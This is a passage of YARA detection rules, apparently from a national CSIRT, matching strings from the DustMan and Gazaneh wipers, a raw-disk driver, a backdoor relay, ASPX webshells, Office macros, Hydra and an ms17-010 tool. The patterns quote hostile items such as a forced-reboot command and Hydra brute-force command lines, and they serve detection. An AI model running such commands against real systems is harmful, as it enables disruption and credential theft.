      $s10 = "SUP_IOCTL_PAGE_LOCK: Invalid input/output sizes. cbIn=%ld expected %ld." fullword ascii
      $s11 = "SUP_IOCTL_CALL_VMMR0: Invalid input/output sizes. cbIn=%ld expected %ld. cbOut=%ld expected %ld." fullword ascii
      $s12 = "VBoxDrvLinuxIOCtl: too much output! %#x > %#x; uCmd=%#x!" fullword ascii
      $s13 = "supdrvLdrFree: Image '%s' has %d dangling objects!" fullword ascii
      $s14 = "SUP_IOCTL_PAGE_LOCK: Invalid input/output sizes. cbOut=%ld expected %ld." fullword ascii
      $s15 = "!supdrvCheckInvalidChar(pReq->u.In.szName, \";:()[]{}/\\\\|&*%#@!~`\\\"'\")" fullword ascii
      $s16 = "\\DosDevices\\VBoxDrv" fullword wide
      $s17 = "SUP_IOCTL_LDR_GET_SYMBOL: %s" fullword ascii
      $s18 = "pReq->Hdr.cbIn <= SUP_IOCTL_PAGE_ALLOC_SIZE_IN" fullword ascii
      $s19 = "pReq->Hdr.cbIn <= SUP_IOCTL_LOW_ALLOC_SIZE_IN" fullword ascii
      $s20 = "SUP_IOCTL_LDR_LOAD: sym #%ld: unterminated name! (%#lx / %#lx)" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 200KB and
        pe.imphash() == "b262e8d078ede007ebd0aa71b9152863" and pe.exports("AssertMsg1") and pe.exports("RTAssertDoBreakpoint") and pe.exports("RTMpDoesCpuExist") and pe.exports("SUPR0ContAlloc") and pe.exports("SUPR0ContFree") and pe.exports("SUPR0GipMap") and
        ( 1 of ($x*) or 4 of ($s*) )
      ) or ( all of them )
}

rule DustMan_Dustman {
   meta:
      hash1 = "f07b0c79a8c88a5760847226af277cf34ab5508394a58820db4db5a8d0340fc7"
   strings:
      $x1 = "C:\\windows\\system32\\cmd.exe" fullword ascii
      $x2 = "C:\\Users\\Admin\\Desktop\\Dustman\\x64\\Release\\Dustman.pdb" fullword ascii
      $s3 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s4 = "elrawdsk.sys" fullword wide
      $s5 = "qpppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppqphppphpp" fullword ascii
      $s6 = "Wpppppppppppppppqpppfppprppprpppsppprppptppphpppuppp}pppvpppypppwppp|pppxppp|pppyppp|pppzpppwppp{pppxppp|pppfppp}pppfppp" fullword ascii
      $s7 = "ipppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppOp0qppp" fullword ascii
      $s8 = "!q0qpppyPppppppp\"q0qpppzPpppppp`\"q0qpppKPppppppP\"q0qpppqTpppppp@\"q0qpppyTpppppp0\"q0qpppzTpppppp \"q0qpppKTpppppp" fullword ascii
      $s9 = "qppppp{0x.pppp~ppppppppppppppppqpppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp0" fullword ascii
      $s10 = "ppLSpppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp8" fullword ascii
      $s11 = "\"q0qpppqDppppppp#q0qpppyDpppppp`#q0qpppzDppppppP#q0qpppqHpppppp@#q0qpppzHpppppp0#q0qpppqLpppppp #q0qpppzLpppppp" fullword ascii
      $s12 = "zpppppp" fullword ascii /* reversed goodware string 'ppppppz' */
      $s13 = "ppprppp`ppp}pppapppbpppbppprpppQppp}pppEppprppp1ppp}ppp3ppprppp pppappp\"ppp}ppp#ppp}ppp'pppfppp)ppp{ppp" fullword ascii
      $s14 = "/c agent.exe A" fullword ascii
      $s15 = "<q0qpppOtppppppp=q0qppp0tpppppp`=q0qppp1tppppppP=q0qppp3tpppppp@=q0qppp4tpppppp8=q0qppp5tpppppp(=q0qppp6tpppppp" fullword ascii
      $s16 = "<pp[=ppq?pppeeeqeeereeeseeeteeeueeeveeeweeexeeeyeeezeee{eee|eee}eee~eee" fullword ascii
      $s17 = "\\assistant.sys" fullword wide
      $s18 = ":q0qpppitppppppx;q0qpppjtpppppph;q0qpppktppppppX;q0qpppltppppppH;q0qpppmtpppppp8;q0qpppntpppppp(;q0qpppotpppppp" fullword ascii
      $s19 = ">q0qpppjxppppppx?q0qpppmxppppppP?q0qppp\\xpppppp@?q0qpppKxpppppp8?q0qpppNxpppppp(?q0qppp3xpppppp" fullword ascii
      $s20 = ";q0qpppZtppppppx<q0qppp[tpppppph<q0qppp\\tppppppX<q0qppp]tpppppp0<q0qppp_tpppppp <q0qpppBtpppppp" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 800KB and
        pe.imphash() == "47cb8a71a145ac31ea5df1b531c7fa09" and
        ( 1 of ($x*) or 4 of ($s*) )
      ) or ( all of them )
}

rule DustMan_agent {
   meta:
      hash1 = "44100c73c6e2529c591a10cd3668691d92dc0241152ec82a72c6e63da299d3a2"
   strings:
      $x1 = "C:\\Users\\Admin\\Desktop\\Dustman\\Furutaka\\drv\\agent.plain.pdb" fullword ascii
      $s2 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide
      $s3 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s4 = "b4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d" fullword wide
      $s5 = "operator co_await" fullword ascii
      $s6 = "api-ms-win-appmodel-runtime-l1-1-2" fullword wide
      $s7 = "bad array new length" fullword ascii
      $s8 = ".CRT$XIAC" fullword ascii
      $s9 = ".?AVERDError@@" fullword ascii
      $s10 = ".?AVbad_array_new_length@std@@" fullword ascii
      $s11 = "\\\\?\\ElRawDisk" fullword wide
      $s12 = "api-ms-win-core-file-l1-2-2" fullword wide
      $s13 = ".CRT$XCL" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 300KB and
        pe.imphash() == "75f159bf634600808810849f244592eb" and
        ( 1 of ($x*) or 4 of ($s*) )
      ) or ( all of them )
}

rule elrawdsk {
   meta:
      hash1 = "36a4e35abf2217887e97041e3e0b17483aa4d2c1aee6feadd48ef448bf1b9e6c"
   strings:
      $x1 = "c:\\projects\\rawdisk\\bin\\wnet\\fre\\amd64\\elrawdsk.pdb" fullword ascii
      $s2 = "elrawdsk.sys" fullword wide
      $s3 = "RawDisk Driver. Allows write access to files and raw disk sectors for user mode applications in Windows 2000 and later." fullword wide
      $s4 = "\\DosDevices\\ElRawDisk" fullword wide
      $s5 = "Copyright (C) 2007-2012, EldoS Corporation " fullword wide
      $s6 = "IoGetDiskDeviceObject" fullword wide
      $s7 = "\\#{9A6DB7D2-FECF-41ff-9A92-6EDA696613DF}#" fullword wide
      $s8 = "\\#{8A6DB7D2-FECF-41ff-9A92-6EDA696613DE}#" fullword wide
      $s9 = "EldoS Corporation" fullword wide
      $s10 = "{25EC4453-AB06-4b3f-BCF0-B260A68B64C9}" fullword ascii
      $s11 = "\\Device\\ElRawDisk" fullword wide
      $s12 = "###ElRawDiskAMD64###" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 70KB and
        pe.imphash() == "6863bacaac5428e1e55a107a613c0717" and
        ( 1 of ($x*) or 4 of ($s*) )
      ) or ( all of them )
}

rule svhost_svhost4 {
   meta:
      hash1 = "5d9ca99eab1bcf2d673df9e5149140c5548c441f2bfe121244bb16f058175a04"
   strings:
      $x1 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\svchost.exe" fullword wide
      $x2 = "C:\\\\windows\\\\temp\\sysBin.sys" fullword wide
      $s3 = "C:\\users\\" fullword wide
      $s4 = "C:\\Documents and Settings\\" fullword wide
      $s5 = "C:\\windows\\system32\\" fullword wide
      $s6 = "Gazaneh.exe" fullword wide
      $s7 = "ProcessProtection" fullword ascii
      $s8 = "C:\\Recovery\\" fullword wide
      $s9 = "C:\\inetpub\\" fullword wide
      $s10 = "C:\\ProgramData\\" fullword wide
      $s11 = ".NET Framework 4@" fullword ascii
      $s12 = "Gazaneh.Properties.Resources.resources" fullword ascii
      $s13 = "E89E4E2EDAD1B7044E0C57DC6BEDDA82B7C46E3F" fullword ascii
      $s14 = "/C shutdown /R /T 0 /F" fullword wide
      $s15 = "Gazaneh.Properties.Resources" fullword wide
      $s16 = "GetDirectores" fullword ascii
      $s17 = "Gazaneh.Properties" fullword ascii
      $s18 = "FileShareWrite" fullword ascii
      $s19 = "$d39595c2-76fa-47fb-9891-3b4f4eb9c113" fullword ascii
      $s20 = "FileShareRead" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 40KB and
        ( 1 of ($x*) and 4 of ($s*) )
      ) or ( all of them )
}

rule svhost_svhost3 {
   meta:
      hash1 = "bec0fa0c2bb6fde0d7ea58b75926f9b80d1248b6ecc49204735ce685a82c6e72"
   strings:
      $x1 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\svchost.exe" fullword wide
      $x2 = "C:\\\\windows\\\\temp\\sysBin.sys" fullword wide
      $s3 = "C:\\users\\" fullword wide
      $s4 = "C:\\Documents and Settings\\" fullword wide
      $s5 = "C:\\windows\\system32\\" fullword wide
      $s6 = "Gazaneh.exe" fullword wide
      $s7 = "ProcessProtection" fullword ascii
      $s8 = "C:\\Recovery\\" fullword wide
      $s9 = "C:\\inetpub\\" fullword wide
      $s10 = "C:\\ProgramData\\" fullword wide
      $s11 = "Gazaneh.Properties.Resources.resources" fullword ascii
      $s12 = "E89E4E2EDAD1B7044E0C57DC6BEDDA82B7C46E3F" fullword ascii
      $s13 = "/C shutdown /R /T 0 /F" fullword wide
      $s14 = "Gazaneh.Properties.Resources" fullword wide
      $s15 = "GetDirectores" fullword ascii
      $s16 = "15.0.0.0" fullword ascii
      $s17 = "15.9.0.0" fullword ascii
      $s18 = "Gazaneh.Properties" fullword ascii
      $s19 = "FileShareWrite" fullword ascii
      $s20 = "$d39595c2-76fa-47fb-9891-3b4f4eb9c113" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 40KB and
        ( 1 of ($x*) and 4 of ($s*) )
      ) or ( all of them )
}

rule _svhost3_svhost4_0 {
   meta:
      hash1 = "bec0fa0c2bb6fde0d7ea58b75926f9b80d1248b6ecc49204735ce685a82c6e72"
      hash2 = "5d9ca99eab1bcf2d673df9e5149140c5548c441f2bfe121244bb16f058175a04"
   strings:
      $x1 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\svchost.exe" fullword wide
      $x2 = "C:\\\\windows\\\\temp\\sysBin.sys" fullword wide
      $s3 = "C:\\users\\" fullword wide
      $s4 = "C:\\Documents and Settings\\" fullword wide
      $s5 = "C:\\windows\\system32\\" fullword wide
      $s6 = "Gazaneh.exe" fullword wide
      $s7 = "ProcessProtection" fullword ascii
      $s8 = "C:\\Recovery\\" fullword wide
      $s9 = "C:\\inetpub\\" fullword wide
      $s10 = "C:\\ProgramData\\" fullword wide
      $s11 = "Gazaneh.Properties.Resources.resources" fullword ascii
      $s12 = "E89E4E2EDAD1B7044E0C57DC6BEDDA82B7C46E3F" fullword ascii
      $s13 = "/C shutdown /R /T 0 /F" fullword wide
      $s14 = "Gazaneh.Properties.Resources" fullword wide
      $s15 = "GetDirectores" fullword ascii
      $s16 = "Gazaneh.Properties" fullword ascii
      $s17 = "FileShareWrite" fullword ascii
      $s18 = "$d39595c2-76fa-47fb-9891-3b4f4eb9c113" fullword ascii
      $s19 = "FileShareRead" fullword ascii
      $s20 = "WipePass" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 40KB and
        pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of ($s*) )
      ) or ( all of them )
}

rule S179_Backdoor_relay {
        meta:
                description = "S179 Backdoor"
        strings:
		$login = "speak, friend, and enter"
                $help1 = "add [client id] [dest address] [listen port]"
		$help2 = "bounds [listen port] to [dest address], example:"
        condition:
                (uint16(0) == 0x5A4D) and all of them
}


rule S179_UnknownEXE {
	meta:
                description = "S179 Port scanner, Unknwon EXE"
	strings:
		$banner1 = "usage : file.exe [-t threadCount] [-p portNumber1,portNumber2,...] [-share] -sr ipRangeStart  -er ipRangeEnd"
		$banner2 = "example : file.exe -t 20 -p 445,80 -sr 192.168.11.20  -er 192.168.13.100"
	condition:
		(uint16(0) == 0x5A4D) and all of them

}

rule S179_Angry_IP_Scanner {
	meta:
		description = "Angery IP Scanner"
	strings:
		$s1 = "GET /O/"
		$s2 = "SCAN.VERSION{_"
		$s3 = "G+TTP/1.0"
	condition:
		(uint16(0) == 0x5A4D) and all of them
}

rule S179_putty {
	meta:
		description = "Putty"
	strings:
		$s1 = "Simon Tatham"
		$s2 = "PuTTY"
	condition:
		(uint16(0) == 0x5A4D) and all of them	
}
rule Office_Wscript_Shell {
	meta:
		description = "Detects an Microsoft Office file that contains Shell or Powershell"
		author = "NCSC"
		date = "2015-05-28"
	strings:
		$s1 = "WScript.Shell"
		$s2 = "powershell"
	condition:
		(
			uint32(0) == 0xd0cf11e0 or // DOC, PPT, XLS
			uint32(0) == 0x504b0304 // DOCX, PPTX, XLSX (PKZIP)
		)
		and all of ($s*) and filesize < 300000
}

rule Office_Macro_AutoOpen
{
    meta:
        description = "Office Document Contains AutoOpen Or AutoExec Macros"
        reference = "support.microsoft.com/kb/286310"
        risk = "medium"

    strings:
        $Macro1 = "VB_"
        $auto1 = "Auto_Open"
        $auto2 = "Auto_Exec"
        $auto3 = "AutoOpen"
        $auto4 = "AutoExec"
	$auto5 = "Document_Open"
    condition:
            (
                  uint32(0) == 0xd0cf11e0 or // DOC, PPT, XLS
                  uint32(0) == 0x504b0304 // DOCX, PPTX, XLSX (PKZIP)
            )
        and 1 of ($Macro*) and 1 of ($auto*)
}

rule Office_Macro_Obfuscation
{
    meta:
        description = "Office Document Contains Obfuscated Macro"
        risk = "medium"

    strings:
        $Macro1 = "VB_"
        $obfuscation_1 = { 22 20 26 20 }
        $obfuscation_2 = { 20 26 20 22 }
        $obfuscation_3 = { 22 20 2b 20 }
        $obfuscation_4 = { 20 2b 20 22 }
        $obfuscation_5 = "Chr("
        $obfuscation_6 = "HexToString"
	$obfuscation_7 = "Private Sub"
    condition:
        (
                uint32(0) == 0xd0cf11e0 or // DOC, PPT, XLS
                uint32(0) == 0x504b0304 // DOCX, PPTX, XLSX (PKZIP)
        )
        and 1 of ($Macro*) and 1 of ($obfuscation_*)
}


rule BOW_Webshell_3{
    meta:
        description = "YARA rule for detecting BOW Webshell."
        author = "NCSC"

    strings:
    	$wf = "<%@" fullword ascii
    	
    	$s0 = "cmd" fullword ascii
    	$s1 = "exe" fullword ascii
    	$s2 = "processStartInfo" fullword ascii

    condition:
    	filesize < 100KB
    	and
    	$wf and (all of ($s*))
}

rule BOW_Webshell_4{
    meta:
        description = "YARA rule for detecting BOW Webshell."
        author = "NCSC"

    strings:
    	$wf = "<%@" fullword ascii
    	
    	$s0 = "WriteAllBytes" fullword ascii
    	$s1 = "switch" fullword ascii
    	$s2 = "case" fullword ascii
    	$s3 = "FromBase64String" fullword ascii
    	
    condition:
    	filesize < 100KB
    	and
    	$wf and (all of ($s*))
}

rule BOW_Webshell_5{
    meta:
        description = "YARA rule for detecting BOW Webshell."
        author = "NCSC"

    strings:
    	$wf = "<%@" fullword ascii
    	
    	$s0 = "pro#=#{0}#|#cmd#=#{1}#|#sav#=#{2}#|#vir#=#{3}#|#nen#=#{4}#|#don#=#{5}#|#tfil#" fullword ascii

    condition:
    	filesize < 100KB
    	and
    	$wf and $s0  	
}



rule BOW_Webshell_6{
    meta:
        description = "YARA rule for detecting BOW Preshell."
        author = "NCSC"

    strings:
    	$wf = "<%@" fullword ascii
    	
    	$s0 = "WriteAllBytes" fullword ascii
    	$s1 = "File.Delete" fullword ascii
    	$s2 = "FromBase64String" fullword ascii
    	
    condition:
    	filesize < 300KB
    	and
    	$wf and (all of ($s*))
}

rule Webshell{

    strings:
    	$wf = "<%@" fullword ascii
    	
    	$s0 = "WriteAllText" fullword ascii
    	$s1 = "FromBase64String" fullword ascii
		$s2 = "encSource"
		$s3 = "authenticateKey"
    	
    condition:
    	filesize < 100KB
    	and
    	$wf and (all of ($s*))
}


rule NCSC_hydra {
   meta:
      description = "file hydra.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "c7d763a41be35078ae7d1f11745eb11f04fb001222dae6abdcf320c862f231ab"
   strings:
      $x1 = "[ATTEMPT-ERROR] target %s - login \"%s\" - pass \"%s\" - child %d - %lu of %lu" fullword ascii /* PEStudio Blacklist: strings */ /* score: '59.00'*/
      $x2 = "[%sATTEMPT] target %s - login \"%s\" - pass \"%s\" - %lu of %lu [child %d]" fullword ascii /* PEStudio Blacklist: strings */ /* score: '56.00'*/
      $x3 = "hydra -l foo -m bar -P pass.txt -m cisco target cisco-enable  (AAA Login foo, password bar)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '55.00'*/
      $x4 = "[COMPLETED] target %s - login \"%s\" - pass \"%s\" - child %d - %lu of %lu" fullword ascii /* PEStudio Blacklist: strings */ /* score: '52.00'*/
      $x5 = "hydra -L urllist.txt -s 3128 target.com http-proxy-urlenum user:pass" fullword ascii /* PEStudio Blacklist: strings */ /* score: '50.00'*/
      $x6 = "\"/exchweb/bin/auth/owaauth.dll:destination=http%%3A%%2F%%2F<target>%%2Fexchange&flags=0&username=<domain>%%5C^USER^&password=^P" ascii /* PEStudio Blacklist: strings */ /* score: '50.00'*/
      $x7 = "hydra -P pass.txt -m cisco target cisco-enable  (Logon password cisco)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '49.00'*/
      $x8 = "hydra -L user.txt -P pass.txt -m 3:SHA:AES:READ target.com snmp" fullword ascii /* PEStudio Blacklist: strings */ /* score: '49.00'*/
      $x9 = "(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=))(COMMAND=reload)(PASSWORD=%s)(SERVICE=)(VERSION=169869568)))" fullword ascii /* PEStudio Blacklist: strings */ /* score: '48.00'*/
      $x10 = "hydra -L urllist.txt http-proxy-urlenum://target.com:3128/user:pass" fullword ascii /* PEStudio Blacklist: strings */ /* score: '46.00'*/
      $x11 = "[DEBUG] we will redo the following combination: target %s  login \"%s\"  pass \"%s\"" fullword ascii /* PEStudio Blacklist: strings */ /* score: '45.00'*/
      $x12 = "The cisco, oracle-listener, snmp and vnc modules are only using the -p or -P option, not login (-l, -L) or colon file (-C)." fullword ascii /* PEStudio Blacklist: strings */ /* score: '45.00'*/
      $x13 = "hydra smb://microsoft.com  -l admin -p D5731CFC6C2A069C21FD0D49CAEBC9EA:2126EE7712D37E265FD63F2C84D2B13D::: -m \"local hash\"" fullword ascii /* PEStudio Blacklist: strings */ /* score: '45.00'*/
      $x14 = "[DEBUG] Target %d - target %s  ip %s  login_no %lu  pass_no %lu  sent %lu  pass_state %d  use_count %d  failed %d  done %d  fail" ascii /* PEStudio Blacklist: strings */ /* score: '44.00'*/
      $x15 = "%d of %d target%s%scompleted, %lu valid password%s found" fullword ascii /* PEStudio Blacklist: strings */ /* score: '43.00'*/
      $x16 = "hydra -P pass.txt -m 2 target.com snmp" fullword ascii /* PEStudio Blacklist: strings */ /* score: '43.00'*/
      $x17 = "-v / -V / -d  verbose mode / show login+pass for each attempt / debug mode " fullword ascii /* PEStudio Blacklist: strings */ /* score: '43.00'*/
      $x18 = "Hydra - THC password cracker - visit http://www.thc.org - use only allowed for legal purposes " fullword ascii /* PEStudio Blacklist: strings */ /* score: '41.00'*/
      $x19 = "%s is a tool to guess/crack valid login/password pairs - usage only allowed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '41.00'*/
      $x20 = "[ERROR] the target is using HTTP auth, not a web form, received HTTP error code 401. Use module \"http%s-get\" instead." fullword ascii /* PEStudio Blacklist: strings */ /* score: '40.50'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 1000KB and
        pe.imphash() == "cc2d79f7f46367844052cbad0fb97e35" and
        ( 1 of ($x*) )
      ) or ( all of them )
}

rule NCSC_ms17_010 {
   meta:
      description = "ms17-010.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "ffb6acd2715dd988fe3c3fdbd7d45159f8e5b529eea506a856109a8696e93a80"
   strings:
      $s1 = "Fatal error: unable to decode the command line argument #%i" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s2 = "Cannot GetProcAddress for Py_NoUserSiteDirectory" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s3 = "Failed to execute script %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s4 = "Failed to convert Wflag %s using mbstowcs (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s5 = "Failed to get executable path. " fullword ascii /* score: '22.00'*/
      $s6 = "Cannot GetProcAddress for Py_FileSystemDefaultEncoding" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s7 = "Failed to get UTF-8 buffer size (WideCharToMultiByte: %s)" fullword ascii /* score: '21.00'*/
      $s8 = "Cannot GetProcAddress for PyUnicode_DecodeFSDefault" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s9 = "libgcj-16.dll" fullword ascii /* score: '20.00'*/
      $s10 = "Failed to get ANSI buffer size(WideCharToMultiByte: %s)" fullword ascii /* score: '20.00'*/
      $s11 = "python%02d.dll" fullword ascii /* score: '20.00'*/
      $s12 = "Installing PYZ: Could not get sys.path" fullword ascii /* PEStudio Blacklist: strings */ /* score: '19.00'*/
      $s13 = "Failed to convert executable path to UTF-8." fullword ascii /* score: '19.00'*/
      $s14 = "Failed to get _MEIPASS as PyObject." fullword ascii /* score: '18.00'*/
      $s15 = "Failed to convert pyhome to ANSI (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s16 = "Failed to convert pypath to ANSI (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s17 = "Could not get __main__ module's dict." fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00'*/
      $s18 = "Cannot GetProcAddress for PyMarshal_ReadObjectFromString" fullword ascii /* score: '17.00'*/
      $s19 = "GZDZFZEZG" fullword ascii /* base64 encoded string 'd6EdFF' */ /* score: '16.50'*/
      $s20 = "Could not get __main__ module." fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 12000KB and
        pe.imphash() == "4e3e7ce958acceeb80e70eeb7d75870e" and
        ( 8 of them )
      ) or ( all of them )
}

rule NCSC_pywin32_221_win32_py2_6 {
   meta:
      description = "pywin32-221.win32-py2.6.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "82b62e100802db25607829b259fc9a61289761a0536e25075ca189b94949ac7c"
   strings:
      $x1 = "PLATLIB/pywin32_system32/pythoncomloader26.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '49.00'*/
      $x2 = "PLATLIB/pywin32_system32/pythoncomloader26.dllPK" fullword ascii /* PEStudio Blacklist: strings */ /* score: '43.00'*/
      $x3 = "PLATLIB/pywin32_system32/pythoncom26.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '40.00'*/
      $x4 = "PLATLIB/pywin32_system32/pywintypes26.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.00'*/
      $x5 = "PLATLIB/pywin32_system32/pythoncom26.dllPK" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00'*/
      $x6 = "PLATLIB/win32comext/shell/demos/dump_link.pymT]o" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x7 = "PLATLIB/isapi/PyISAPI_loader.dll" fullword ascii /* score: '32.00'*/
      $x8 = "PLATLIB/win32comext/shell/demos/dump_link.pyPK" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $x9 = "PLATLIB/win32comext/axscript/client/pydumper.pyPK" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s10 = "PLATLIB/pywin32_system32/pywintypes26.dllPK" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s11 = "PLATLIB/win32comext/axscript/client/pydumper.py" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s12 = "PLATLIB/win32comext/shell/demos/IFileOperationProgressSink.py" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s13 = "PLATLIB/win32comext/shell/demos/IFileOperationProgressSink.pyPK" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s14 = "PLATLIB/win32comext/shell/test/testSHFileOperation.pyPK" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s15 = "PLATLIB/win32comext/shell/demos/shellexecuteex.pyPK" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s16 = "PLATLIB/win32comext/shell/demos/shellexecuteex.py" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s17 = "PLATLIB/win32comext/shell/test/testSHFileOperation.py" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s18 = "PLATLIB/win32comext/axscript/test/debugTest.vbs" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s19 = "PLATLIB/win32com/demos/dump_clipboard.pyPK" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s20 = "PLATLIB/win32com/demos/dump_clipboard.py" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 20000KB and
        ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule NCSC_chro {
   meta:
      description = "chro.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "a2155e4dd281ef7b01a1490943b7fb06706d7ef02c0f955611e941d06b6e3ccf"
   strings:
      $s1 = "Fatal error: unable to decode the command line argument #%i" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s2 = "Cannot GetProcAddress for Py_NoUserSiteDirectory" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s3 = "Failed to execute script %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s4 = "impacket.system_errors(" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s5 = "Failed to convert Wflag %s using mbstowcs (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s6 = "Failed to get executable path. " fullword ascii /* score: '22.00'*/
      $s7 = "Cannot GetProcAddress for Py_FileSystemDefaultEncoding" fullword ascii /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s8 = "Failed to get UTF-8 buffer size (WideCharToMultiByte: %s)" fullword ascii /* score: '21.00'*/
      $s9 = "bCrypto.Hash._SHA256.pyd" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s10 = "Cannot GetProcAddress for PyUnicode_DecodeFSDefault" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s11 = "libgcj-16.dll" fullword ascii /* score: '20.00'*/
      $s12 = "Failed to get ANSI buffer size(WideCharToMultiByte: %s)" fullword ascii /* score: '20.00'*/
      $s13 = "python%02d.dll" fullword ascii /* score: '20.00'*/
      $s14 = "Installing PYZ: Could not get sys.path" fullword ascii /* PEStudio Blacklist: strings */ /* score: '19.00'*/
      $s15 = "Failed to convert executable path to UTF-8." fullword ascii /* score: '19.00'*/
      $s16 = "bCrypto.Random.OSRNG.winrandom.pyd" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s17 = "Failed to get _MEIPASS as PyObject." fullword ascii /* score: '18.00'*/
      $s18 = "Failed to convert pyhome to ANSI (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s19 = "Failed to convert pypath to ANSI (invalid multibyte string)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s20 = "Could not get __main__ module's dict." fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 16000KB and
        pe.imphash() == "4e3e7ce958acceeb80e70eeb7d75870e" and
        ( 8 of them )
      ) or ( all of them )
}

rule NCSC_chro_2 {
   meta:
      description = "chro.zip"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "4355d77fbe382549fd0fb292b2c24e481da6971bd48da950a3146adaf79a6b58"
   strings:
      $s1 = "chro_guest.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s2 = "chro_no.exe" fullword ascii /* score: '19.00'*/
      $s3 = "GZDZFZEZG" fullword ascii /* base64 encoded string 'd6EdFF' */ /* score: '16.50'*/
      $s4 = "chro_guest.exePK" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.00'*/
      $s5 = "23333333333" fullword ascii /* reversed goodware string '33333333332' */ /* score: '14.00'*/
      $s6 = "?^:B:X:J:\\:D:U:Z:I:V:F:Y:N:L:E" fullword ascii /* score: '12.42'*/
      $s7 = "* +4\"N" fullword ascii /* score: '11.00'*/
      $s8 = "4c[?u:\\*|" fullword ascii /* score: '10.00'*/
      $s9 = "r-l666:H G" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.00'*/
      $s10 = "v:\\KP5" fullword ascii /* score: '9.00'*/
      $s11 = "yVy:\"K" fullword ascii /* score: '9.00'*/
      $s12 = "W1m:\"k" fullword ascii /* score: '9.00'*/
      $s13 = "pxBR:\\^" fullword ascii /* score: '9.00'*/
